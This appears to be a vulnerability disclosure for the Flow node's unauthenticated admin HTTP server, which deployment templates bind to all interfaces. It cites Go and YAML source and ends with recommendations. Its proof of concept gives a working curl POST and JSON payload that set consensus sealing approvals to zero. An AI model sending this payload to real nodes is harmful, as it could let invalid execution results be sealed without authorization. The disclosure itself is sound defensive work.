### Title
Unauthenticated Admin HTTP Server Accepts Privileged Commands When Bound to All Interfaces — (`admin/command_runner.go`)

### Summary
The Flow node admin HTTP server starts with no authentication by default. When operators configure `--admin-addr=0.0.0.0:9002` (as shown in production deployment templates), any host with network access to that port can invoke privileged admin commands — including `set-config` to change consensus sealing parameters — without any credential check.

### Finding Description

`CommandRunner.runAdminServer()` starts two servers: a gRPC backend on a Unix socket (local-only, safe) and an HTTP frontend on `r.httpAddress` (the `--admin-addr` flag value). [1](#0-0) 

The HTTP server carries no authentication middleware. TLS is only added when all three of `AdminCert`, `AdminKey`, and `AdminClientCAs` are explicitly provided; without them the server runs plain HTTP with zero identity verification. [2](#0-1) 

The `/admin/run_command` endpoint dispatches to any registered handler based solely on the `commandName` field in the POST body. [3](#0-2) 

Production and benchnet deployment templates explicitly bind the admin server to all interfaces: [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) 

The `set-config` command, registered for every node type, accepts arbitrary config-field updates with no further authorization: [9](#0-8) 

Registered default commands include `set-config`, `set-log-level`, `read-blocks`, `get-latest-identity`, and more: [10](#0-9) 

Execution nodes additionally expose `stop-at-height` and `trigger-checkpoint`: [11](#0-10) 

A second, entirely separate admin HTTP server exists for the ledger service (`cmd/ledger/admin.go`). It has no TLS support at all, no authentication, and the README explicitly documents `--admin-addr 0.0.0.0:9003` as the example invocation: [12](#0-11) [13](#0-12) [14](#0-13) 

### Impact Explanation

An attacker with network access to port 9002 on a consensus node can POST:

```
{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}
```

This sets the minimum chunk-approval count to zero on that node, meaning it will seal execution results without waiting for verification-node approvals. If the same command is delivered to a supermajority of consensus nodes (all of whose admin ports are bound to `0.0.0.0`), the network will seal blocks regardless of whether execution results are valid. This constitutes unauthorized mutation of on-chain finality guarantees — invalid execution results can be permanently sealed — without the attacker controlling any staked node key. [9](#0-8) 

### Likelihood Explanation

The admin port is not authenticated by default and the official deployment templates bind it to `0.0.0.0`. Any host co-located in the same Kubernetes cluster, VPC, or data-center network segment — including an unprivileged observer node, a compromised co-tenant, or a misconfigured firewall rule — can reach port 9002 without credentials. No staked-node key, no private key, and no social engineering is required; a plain HTTP POST suffices.

### Recommendation

- Bind the admin server to `127.0.0.1` (localhost) by default; require an explicit opt-in to bind to other interfaces.
- Require mutual TLS (`--admin-cert`, `--admin-key`, `--admin-client-certs`) whenever the server is bound to a non-loopback address; refuse to start in plain-HTTP mode on a routable interface.
- Apply the same controls to the ledger-service admin server (`cmd/ledger/admin.go`), which currently has no TLS path at all.

### Proof of Concept

With `--admin-addr=0.0.0.0:9002` and no TLS flags set (the documented default for benchnet/localnet), from any host that can reach the consensus node:

```bash
# Disable chunk-approval requirement on a consensus node
curl -s -X POST http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}'
# Returns: {"output":{"newValue":0,"oldValue":1}}
```

No authentication token, certificate, or node key is required. Repeating this against a supermajority of consensus nodes removes the verification-approval gate from the sealing path entirely.

### Citations

**File:** admin/command_runner.go (L249-265)
```go
	httpServer := &http.Server{
		Addr:      r.httpAddress,
		Handler:   mux,
		TLSConfig: r.tlsConfig,
	}

	r.workersStarted.Add(1)
	r.workersFinished.Go(func() {
		r.workersStarted.Done()

		// Start HTTP server (and proxy calls to gRPC server endpoint)
		var err error
		if r.tlsConfig == nil {
			err = httpServer.ListenAndServe()
		} else {
			err = httpServer.ListenAndServeTLS("", "")
		}
```

**File:** cmd/scaffold.go (L756-775)
```go
		if node.AdminCert != NotSet {
			serverCert, err := tls.LoadX509KeyPair(node.AdminCert, node.AdminKey)
			if err != nil {
				return nil, err
			}
			clientCAs, err := os.ReadFile(node.AdminClientCAs)
			if err != nil {
				return nil, err
			}
			certPool := x509.NewCertPool()
			certPool.AppendCertsFromPEM(clientCAs)
			config := &tls.Config{
				MinVersion:   tls.VersionTLS13,
				Certificates: []tls.Certificate{serverCert},
				ClientAuth:   tls.RequireAndVerifyClientCert,
				ClientCAs:    certPool,
			}

			opts = append(opts, admin.WithTLS(config))
		}
```

**File:** cmd/scaffold.go (L2024-2045)
```go
func (fnb *FlowNodeBuilder) RegisterDefaultAdminCommands() {
	fnb.AdminCommand("set-log-level", func(config *NodeConfig) commands.AdminCommand {
		return &common.SetLogLevelCommand{}
	}).AdminCommand("set-golog-level", func(config *NodeConfig) commands.AdminCommand {
		return &common.SetGologLevelCommand{}
	}).AdminCommand("get-config", func(config *NodeConfig) commands.AdminCommand {
		return common.NewGetConfigCommand(config.ConfigManager)
	}).AdminCommand("set-config", func(config *NodeConfig) commands.AdminCommand {
		return common.NewSetConfigCommand(config.ConfigManager)
	}).AdminCommand("list-configs", func(config *NodeConfig) commands.AdminCommand {
		return common.NewListConfigCommand(config.ConfigManager)
	}).AdminCommand("read-blocks", func(config *NodeConfig) commands.AdminCommand {
		return storageCommands.NewReadBlocksCommand(config.State, config.Storage.Blocks)
	}).AdminCommand("read-range-blocks", func(conf *NodeConfig) commands.AdminCommand {
		return storageCommands.NewReadRangeBlocksCommand(conf.Storage.Blocks)
	}).AdminCommand("read-results", func(config *NodeConfig) commands.AdminCommand {
		return storageCommands.NewReadResultsCommand(config.State, config.Storage.Results)
	}).AdminCommand("read-seals", func(config *NodeConfig) commands.AdminCommand {
		return storageCommands.NewReadSealsCommand(config.State, config.Storage.Seals, config.Storage.Index)
	}).AdminCommand("get-latest-identity", func(config *NodeConfig) commands.AdminCommand {
		return common.NewGetIdentityCommand(config.IdentityProvider)
	})
```

**File:** admin/admin/admin.pb.gw.go (L74-95)
```go
	mux.Handle("POST", pattern_Admin_RunCommand_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		var stream runtime.ServerTransportStream
		ctx = grpc.NewContextWithServerTransportStream(ctx, &stream)
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateIncomingContext(ctx, mux, req, "/admin.Admin/RunCommand", runtime.WithHTTPPathPattern("/admin/run_command"))
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := local_request_Admin_RunCommand_0(rctx, inboundMarshaler, server, req, pathParams)
		md.HeaderMD, md.TrailerMD = metadata.Join(md.HeaderMD, stream.Header()), metadata.Join(md.TrailerMD, stream.Trailer())
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}

		forward_Admin_RunCommand_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)

	})
```

**File:** integration/benchnet2/automate/templates/helm-values-all-nodes.yml (L19-19)
```yaml
        - --admin-addr=0.0.0.0:9002
```

**File:** integration/benchnet2/automate/templates/helm-values-all-nodes.yml (L47-47)
```yaml
        - --loglevel=INFO
```

**File:** integration/benchnet2/automate/templates/helm-values-all-nodes.yml (L72-72)
```yaml
        - --admin-addr=0.0.0.0:9002
```

**File:** integration/benchnet2/automate/templates/helm-values-all-nodes.yml (L99-99)
```yaml
        - --admin-addr=0.0.0.0:9002
```

**File:** integration/localnet/builder/bootstrap.go (L586-586)
```go
			fmt.Sprintf("--admin-addr=0.0.0.0:%s", testnet.AdminPort),
```

**File:** admin/commands/common/set_config.go (L33-51)
```go
func (s *SetConfigCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	validatedReq := req.ValidatorData.(validatedSetConfigData)

	oldValue := validatedReq.field.Get()

	err := validatedReq.field.Set(validatedReq.value)
	if err != nil {
		if updatable_configs.IsValidationError(err) {
			return nil, fmt.Errorf("config update failed due to invalid input: %w", err)
		}
		return nil, fmt.Errorf("unexpected error setting config field %s: %w", validatedReq.field.Name, err)
	}

	res := map[string]any{
		"oldValue": oldValue,
		"newValue": validatedReq.value,
	}

	return res, nil
```

**File:** cmd/execution_builder.go (L195-199)
```go
		AdminCommand("trigger-checkpoint", func(config *NodeConfig) commands.AdminCommand {
			return executionCommands.NewTriggerCheckpointCommand(exeNode.toTriggerCheckpoint, exeNode.exeConf.ledgerServiceAddr, exeNode.exeConf.ledgerServiceAdminAddr)
		}).
		AdminCommand("stop-at-height", func(config *NodeConfig) commands.AdminCommand {
			return executionCommands.NewStopAtHeightCommand(exeNode.stopControl)
```

**File:** cmd/ledger/admin.go (L36-46)
```go
func newAdminHandler(logger zerolog.Logger, triggerCheckpoint *atomic.Bool) http.Handler {
	h := &adminHandler{
		logger:            logger.With().Str("component", "admin").Logger(),
		triggerCheckpoint: triggerCheckpoint,
		commands:          []string{"ping", "list-commands", "trigger-checkpoint"},
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/admin/run_command", h.handleCommand)
	return mux
}
```

**File:** cmd/ledger/main.go (L231-243)
```go
	if *adminAddr != "" {
		adminHandler := newAdminHandler(logger, triggerCheckpointOnNextSegmentFinish)
		adminServer = &http.Server{
			Addr:    *adminAddr,
			Handler: adminHandler,
		}

		go func() {
			logger.Info().Str("admin_addr", *adminAddr).Msg("starting admin HTTP server")
			if err := adminServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				logger.Error().Err(err).Msg("admin HTTP server error")
			}
		}()
```

**File:** cmd/ledger/README.md (L42-46)
```markdown
# With admin server enabled (use port 9003 to avoid conflict with execution node's 9002)
./flow-ledger-service \
  -triedir /path/to/trie \
  -ledger-service-tcp 0.0.0.0:9000 \
  -admin-addr 0.0.0.0:9003
```
